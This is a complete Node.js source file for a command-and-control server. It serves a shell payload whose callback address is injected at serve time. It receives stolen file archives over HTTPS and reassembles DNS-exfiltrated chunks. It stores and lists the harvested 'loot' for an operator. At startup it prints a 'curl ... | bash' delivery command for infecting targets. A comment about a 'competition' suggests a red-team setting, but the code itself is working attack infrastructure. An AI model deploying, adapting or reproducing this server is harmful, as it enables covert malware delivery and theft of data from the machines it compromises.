#!/usr/bin/env node
// =============================================================================
// Combined C2 Ingest + Payload Delivery Server
// =============================================================================
// Serves:
//   GET  /gg.sh           — payload (C2_URL injected dynamically from request Host)
//   GET  /                — status + loot list
//   GET  /loot/<id>/<fp>  — read harvested file
//   POST /ingest          — receive harvest payload (base64(tar.gz))
//   POST /dns-reassemble  — reassemble DNS-exfiltrated chunks
//   DELETE /loot/<id>     — purge harvest data
//
// The C2_URL inside gg.sh is replaced at serve time so the payload always
// phones home to whatever origin served it — no hardcoded domain needed.
//
// Usage:
//   node c2-server.js                       # HTTPS :4443, self-signed certs
//   PORT=8443 node c2-server.js             # custom port
//   HTTP=1 node c2-server.js                # plain HTTP (dev / behind proxy)
//   CERT=/path/cert.pem KEY=/path/key.pem   # custom TLS certs
// =============================================================================

const http = require("http");
const https = require("https");
const fs = require("fs");
const path = require("path");
const zlib = require("zlib");
const { execFile } = require("child_process");

// ── Configuration ─────────────────────────────────────────────────────────────
const HOST = process.env.HOST || "0.0.0.0";
const PORT = parseInt(process.env.PORT || "4443", 10);
const USE_HTTPS = !process.env.HTTP;
const LOOT_DIR = path.resolve(process.env.LOOT_DIR || "./loot");
const MAX_BODY_MB = parseInt(process.env.MAX_BODY_MB || "50", 10);
const AUTH_TOKEN = process.env.AUTH_TOKEN || null;

const CERT_PATH = process.env.CERT || path.join(__dirname, "certs", "cert.pem");
const KEY_PATH  = process.env.KEY  || path.join(__dirname, "certs", "key.pem");

// Path to the payload script (one directory up)
const PAYLOAD_PATH = path.resolve(process.env.PAYLOAD || path.join(__dirname, "..", "gg.sh"));

// ── Helpers ───────────────────────────────────────────────────────────────────

function ts() {
  return new Date().toISOString();
}

function ensureDir(dir) {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
}

// ── Payload Template Engine ───────────────────────────────────────────────────
// Read gg.sh once at startup, serve with C2_URL replaced to match the
// request's Host header. This means the same binary works regardless of
// which domain / IP the server is reached through.

let payloadTemplate = null;

function loadPayloadTemplate() {
  try {
    payloadTemplate = fs.readFileSync(PAYLOAD_PATH, "utf8");
    console.log(`[${ts()}] Loaded payload template: ${PAYLOAD_PATH} (${payloadTemplate.length} bytes)`);
  } catch (e) {
    console.error(`[${ts()}] FATAL: Cannot read payload at ${PAYLOAD_PATH}: ${e.message}`);
    process.exit(1);
  }
}

/**
 * Build the payload for a given request.
 * Replaces C2_URL with the correct origin derived from the Host header.
 * Also sets DNS_DOMAIN to the request hostname if it looks like a real domain.
 */
function buildPayload(req) {
  if (!payloadTemplate) return null;

  // Trust X-Forwarded-Proto from reverse proxy (Cloudflare sets "https")
  // Falls back to the server's own protocol if header is absent
  const proto = req.headers["x-forwarded-proto"] || (USE_HTTPS ? "https" : "http");
  const host = req.headers.host || `127.0.0.1:${PORT}`;
  const c2Url = `${proto}://${host}/ingest`;

  let payload = payloadTemplate;

  // Replace C2_URL — handle both quoted and unquoted variants
  payload = payload.replace(
    /^C2_URL="[^"]*"/m,
    `C2_URL="${c2Url}"`
  );

  // If DNS_DOMAIN is empty and host looks like a domain (not IP:port), set it
  const hostname = host.split(":")[0];
  const isDomain = /^[a-zA-Z]/.test(hostname) && hostname !== "localhost";
  if (isDomain) {
    // Use a subdomain pattern for DNS exfil: exfil.<domain>
    const dnsDomain = `exfil.${hostname}`;
    payload = payload.replace(
      /^DNS_DOMAIN="[^"]*"/m,
      `DNS_DOMAIN="${dnsDomain}"`
    );
  }

  return payload;
}

// ── Archive Extraction ─────────────────────────────────────────────────────────

function decodeAndExtract(base64Chunk, targetDir) {
  return new Promise((resolve, reject) => {
    ensureDir(targetDir);

    const tmpFile = path.join(targetDir, ".tmp.payload.b64");

    try {
      fs.writeFileSync(tmpFile, base64Chunk);
    } catch (writeErr) {
      reject(new Error(`temp file write failed: ${writeErr.message}`));
      return;
    }

    execFile(
      "sh",
      ["-c", `base64 -d < "${tmpFile}" | gunzip | tar xf - -C "${targetDir}"`],
      { timeout: 30000, maxBuffer: MAX_BODY_MB * 1024 * 1024 },
      (err, _stdout, stderr) => {
        try { fs.unlinkSync(tmpFile); } catch (_) {}

        if (err) {
          // Fallback: plain tar (no gzip)
          try { fs.writeFileSync(tmpFile, base64Chunk); } catch (_) {}

          execFile(
            "sh",
            ["-c", `base64 -d < "${tmpFile}" | tar xzf - -C "${targetDir}"`],
            { timeout: 30000 },
            (err2, _stdout2, stderr2) => {
              try { fs.unlinkSync(tmpFile); } catch (_) {}
              if (err2) {
                reject(new Error(
                  `extract failed (gunzip+tar and tar xzf): ${err.message} / ${err2.message} ${stderr} ${stderr2}`
                ));
                return;
              }
              resolve();
            }
          );
          return;
        }
        resolve();
      }
    );
  });
}

// ── DNS Chunk Reassembly ──────────────────────────────────────────────────────

function reassembleDnsPayload(body, targetDir) {
  return new Promise((resolve, reject) => {
    let data;
    try {
      data = JSON.parse(body);
    } catch (e) {
      reject(new Error("invalid JSON in dns-reassemble body"));
      return;
    }

    if (!data.chunks || !Array.isArray(data.chunks) || !data.timestamp) {
      reject(new Error("missing chunks[] or timestamp in dns-reassemble body"));
      return;
    }

    const b64url = data.chunks.join("");
    const b64std = b64url.replace(/-/g, "+").replace(/_/g, "/");

    decodeAndExtract(b64std, targetDir).then(resolve).catch(reject);
  });
}

// ── Loot Directory Listing ────────────────────────────────────────────────────

function listLoot() {
  ensureDir(LOOT_DIR);
  try {
    const entries = fs.readdirSync(LOOT_DIR).sort().reverse();
    return entries.map((name) => {
      const full = path.join(LOOT_DIR, name);
      try {
        const stat = fs.statSync(full);
        if (!stat.isDirectory()) return null;
        let fileCount = 0, totalSize = 0;
        function walk(dir) {
          for (const entry of fs.readdirSync(dir)) {
            const p = path.join(dir, entry);
            const s = fs.statSync(p);
            if (s.isDirectory()) walk(p);
            else { fileCount++; totalSize += s.size; }
          }
        }
        walk(full);
        return { id: name, files: fileCount, size: totalSize };
      } catch (_) { return null; }
    }).filter(Boolean);
  } catch (_) { return []; }
}

// ── Collect POST body with size limit ─────────────────────────────────────────

function collectBody(req, res) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    let bodySize = 0;
    const maxBytes = MAX_BODY_MB * 1024 * 1024;

    req.on("data", (chunk) => {
      bodySize += chunk.length;
      if (bodySize > maxBytes) {
        res.writeHead(413, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ error: "payload too large" }));
        req.destroy();
        reject(new Error("body too large"));
        return;
      }
      chunks.push(chunk);
    });

    req.on("end", () => {
      resolve(Buffer.concat(chunks).toString("utf8"));
    });

    req.on("error", (e) => reject(e));
  });
}

// ── HTTP Handler ──────────────────────────────────────────────────────────────

async function handleRequest(req, res) {
  const clientIp =
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.socket?.remoteAddress ||
    "unknown";

  // ── CORS preflight ──
  if (req.method === "OPTIONS") {
    res.writeHead(204, {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, DELETE, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type, X-Harvest-ID, Authorization",
      "Access-Control-Max-Age": "86400",
    });
    res.end();
    return;
  }

  // ── Optional auth ──
  if (AUTH_TOKEN) {
    const auth = req.headers["authorization"] || "";
    if (auth !== `Bearer ${AUTH_TOKEN}`) {
      console.log(`[${ts()}] REJECT auth from ${clientIp} ${req.method} ${req.url}`);
      res.writeHead(401, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ error: "unauthorized" }));
      return;
    }
  }

  const urlPath = req.url.split("?")[0]; // strip query string

  // ── GET /gg.sh — Payload delivery ──
  if (req.method === "GET" && urlPath === "/gg.sh") {
    const payload = buildPayload(req);
    if (!payload) {
      res.writeHead(500, { "Content-Type": "text/plain" });
      res.end("payload template not loaded");
      return;
    }

    res.writeHead(200, {
      "Content-Type": "text/x-shellscript; charset=utf-8",
      "Content-Length": Buffer.byteLength(payload),
      "Cache-Control": "no-store, no-cache, must-revalidate",
      "X-Payload-Origin": req.headers.host,
    });
    res.end(payload);

    console.log(`[${ts()}] DELIVER payload to ${clientIp} (Host: ${req.headers.host})`);
    return;
  }

  // ── GET / — status + loot list ──
  if (req.method === "GET" && (urlPath === "/" || urlPath === "")) {
    const loot = listLoot();
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({
      status: "running",
      uptime: process.uptime(),
      payload_ready: !!payloadTemplate,
      loot_count: loot.length,
      loot: loot,
    }, null, 2));
    return;
  }

  // ── GET /loot/<id>/<filepath> — read harvested file ──
  if (req.method === "GET" && urlPath.startsWith("/loot/")) {
    const parts = urlPath.slice("/loot/".length).split("/");
    const harvestId = parts[0];
    const filePath = parts.slice(1).join("/");

    if (!harvestId || !filePath) {
      res.writeHead(400, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ error: "format: /loot/<harvest_id>/<filepath>" }));
      return;
    }

    const safeBase = path.resolve(LOOT_DIR, harvestId);
    const safeFile = path.resolve(safeBase, filePath);
    if (!safeFile.startsWith(safeBase + path.sep) && safeFile !== safeBase) {
      res.writeHead(403, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ error: "path traversal denied" }));
      return;
    }

    if (!fs.existsSync(safeFile)) {
      res.writeHead(404, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ error: "file not found" }));
      return;
    }

    try {
      const content = fs.readFileSync(safeFile);
      res.writeHead(200, {
        "Content-Type": "text/plain; charset=utf-8",
        "Content-Length": content.length,
      });
      res.end(content);
    } catch (e) {
      res.writeHead(500, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ error: e.message }));
    }
    return;
  }

  // ── POST /ingest — primary HTTPS exfil endpoint ──
  if (req.method === "POST" && urlPath === "/ingest") {
    const harvestId = req.headers["x-harvest-id"] || Date.now().toString();
    const targetDir = path.join(LOOT_DIR, harvestId);

    console.log(`[${ts()}] INGEST start from ${clientIp} harvest_id=${harvestId}`);

    let body;
    try {
      body = await collectBody(req, res);
    } catch (e) {
      console.error(`[${ts()}] INGEST stream error from ${clientIp}: ${e.message}`);
      return;
    }

    if (!body || body.length === 0) {
      console.log(`[${ts()}] INGEST empty from ${clientIp}`);
      res.writeHead(400, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ error: "empty payload" }));
      return;
    }

    try {
      await decodeAndExtract(body, targetDir);

      const files = [];
      function walk(dir, prefix) {
        try {
          for (const entry of fs.readdirSync(dir)) {
            const p = path.join(dir, entry);
            const s = fs.statSync(p);
            if (s.isDirectory()) walk(p, prefix + entry + "/");
            else files.push({ path: prefix + entry, size: s.size });
          }
        } catch (_) {}
      }
      walk(targetDir, "");

      console.log(`[${ts()}] INGEST ok from ${clientIp} harvest_id=${harvestId} files=${files.length}`);
      files.forEach((f) => console.log(`  ${f.path} (${f.size} bytes)`));

      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ status: "ok", harvest_id: harvestId, files: files.length, detail: files }));
    } catch (e) {
      console.error(`[${ts()}] INGEST error from ${clientIp} harvest_id=${harvestId}: ${e.message}`);
      // Save raw base64 for manual recovery
      try {
        ensureDir(targetDir);
        fs.writeFileSync(path.join(targetDir, "RAW_PAYLOAD.b64"), body);
      } catch (_) {}

      res.writeHead(500, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ status: "extract_failed", harvest_id: harvestId, error: e.message, raw_saved: true }));
    }
    return;
  }

  // ── POST /dns-reassemble — DNS exfil chunk reassembly ──
  if (req.method === "POST" && urlPath === "/dns-reassemble") {
    let body;
    try {
      body = await collectBody(req, res);
    } catch (e) {
      console.error(`[${ts()}] DNS-REASSEMBLE stream error from ${clientIp}: ${e.message}`);
      return;
    }

    const timestamp = JSON.parse(body).timestamp || Date.now().toString();
    const targetDir = path.join(LOOT_DIR, `dns-${timestamp}`);

    console.log(`[${ts()}] DNS-REASSEMBLE from ${clientIp} timestamp=${timestamp}`);

    try {
      await reassembleDnsPayload(body, targetDir);
      console.log(`[${ts()}] DNS-REASSEMBLE ok from ${clientIp} timestamp=${timestamp}`);
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ status: "ok", harvest_id: `dns-${timestamp}` }));
    } catch (e) {
      console.error(`[${ts()}] DNS-REASSEMBLE error from ${clientIp}: ${e.message}`);
      res.writeHead(500, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ error: e.message }));
    }
    return;
  }

  // ── DELETE /loot/<id> — purge a harvest ──
  if (req.method === "DELETE" && urlPath.startsWith("/loot/")) {
    const harvestId = urlPath.slice("/loot/".length).replace(/\/$/, "");
    const targetDir = path.resolve(LOOT_DIR, harvestId);

    if (!targetDir.startsWith(path.resolve(LOOT_DIR) + path.sep)) {
      res.writeHead(403, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ error: "path traversal denied" }));
      return;
    }

    if (!fs.existsSync(targetDir)) {
      res.writeHead(404, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ error: "not found" }));
      return;
    }

    try {
      fs.rmSync(targetDir, { recursive: true, force: true });
      console.log(`[${ts()}] DELETE loot/${harvestId} from ${clientIp}`);
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ status: "deleted", harvest_id: harvestId }));
    } catch (e) {
      res.writeHead(500, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ error: e.message }));
    }
    return;
  }

  // ── 404 ──
  res.writeHead(404, { "Content-Type": "application/json" });
  res.end(JSON.stringify({ error: "not found" }));
}

// ── Boot ───────────────────────────────────────────────────────────────────────

ensureDir(LOOT_DIR);
loadPayloadTemplate();

// Watch for payload file changes (hot reload during competition)
try {
  fs.watch(PAYLOAD_PATH, (eventType) => {
    if (eventType === "change") {
      console.log(`[${ts()}] Payload file changed — reloading template`);
      loadPayloadTemplate();
    }
  });
} catch (_) {}

const handler = handleRequest;

let server;
if (USE_HTTPS) {
  try {
    const cert = fs.readFileSync(CERT_PATH);
    const key  = fs.readFileSync(KEY_PATH);
    server = https.createServer({ cert, key }, handler);
    console.log(`[${ts()}] TLS: enabled (cert=${CERT_PATH})`);
  } catch (e) {
    console.error(`[${ts()}] TLS cert/key not found — falling back to HTTP: ${e.message}`);
    server = http.createServer(handler);
  }
} else {
  server = http.createServer(handler);
  console.log(`[${ts()}] TLS: disabled (HTTP mode)`);
}

server.listen(PORT, HOST, () => {
  const proto = USE_HTTPS ? "https" : "http";
  console.log(`[${ts()}] C2 server listening on ${proto}://${HOST === "0.0.0.0" ? "0.0.0.0" : HOST}:${PORT}`);
  console.log(`[${ts()}] Loot directory: ${LOOT_DIR}`);
  console.log(`[${ts()}] Max body size: ${MAX_BODY_MB} MB`);
  if (AUTH_TOKEN) console.log(`[${ts()}] Auth: Bearer token required`);
  else console.log(`[${ts()}] Auth: none (set AUTH_TOKEN env to enable)`);
  console.log("");
  console.log("Endpoints:");
  console.log(`  GET  ${proto}://HOST:${PORT}/gg.sh          — payload delivery (C2_URL auto-injected)`);
  console.log(`  POST ${proto}://HOST:${PORT}/ingest         — receive harvest payload`);
  console.log(`  POST ${proto}://HOST:${PORT}/dns-reassemble — reassemble DNS-exfiltrated chunks`);
  console.log(`  GET  ${proto}://HOST:${PORT}/               — status + loot list`);
  console.log(`  GET  ${proto}://HOST:${PORT}/loot/<id>/<fp>  — read harvested file`);
  console.log(`  DELETE ${proto}://HOST:${PORT}/loot/<id>     — purge harvest data`);
  console.log("");
  console.log("Delivery command:");
  console.log(`  curl -SsfL ${proto}://HOST:${PORT}/gg.sh | bash`);
});

server.on("error", (e) => {
  if (e.code === "EADDRINUSE") {
    console.error(`[${ts()}] FATAL: port ${PORT} already in use`);
    process.exit(1);
  } else {
    console.error(`[${ts()}] server error: ${e.message}`);
  }
});
